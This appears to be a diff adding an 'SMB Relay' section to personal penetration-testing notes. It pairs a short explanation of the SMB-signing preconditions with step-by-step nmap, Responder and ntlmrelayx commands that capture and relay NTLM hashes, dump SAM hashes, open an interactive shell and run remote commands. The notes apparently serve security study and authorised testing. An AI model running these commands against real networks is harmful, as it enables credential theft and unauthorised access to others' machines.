@@ -13,3 +13,18 @@
 4. ```hashcat -m 5600 hashes.txt (wordlist) -r OneRule```
 
 ## SMB Relay
+If you get a hash from responder, you can relay the hash to other shares without having to crack the hash.
+- Requires smb signing must be disabled or not enforced on target
+- Not enabled on workstations but enforced on servers
+- You cant relay a hash back to yourself. You have to have it on a different machine
+
+1. Identify host without SMB signing -- ```nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24```
+2. Update responder -- ```sudo mousepad /etc/responder/Responder.conf```
+   - Turn off SMB and HTTP
+3. Run Responder -- ```sudo responder -I eth0 -dwP```
+4. Setup your relay -- ```sudo ntlmrelayx.py -tf targets.txt -smb2support```
+5. Need an event to occur
+6. This will then dump out the hashes of the SAM
+7. Alternative for interactive shell -- ```sudo ntlmrelayx.py -tf targets.txt -smbsupport -i```
+8. ```nc 127.0.0.1 11000```
+9. Alternative -- sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"
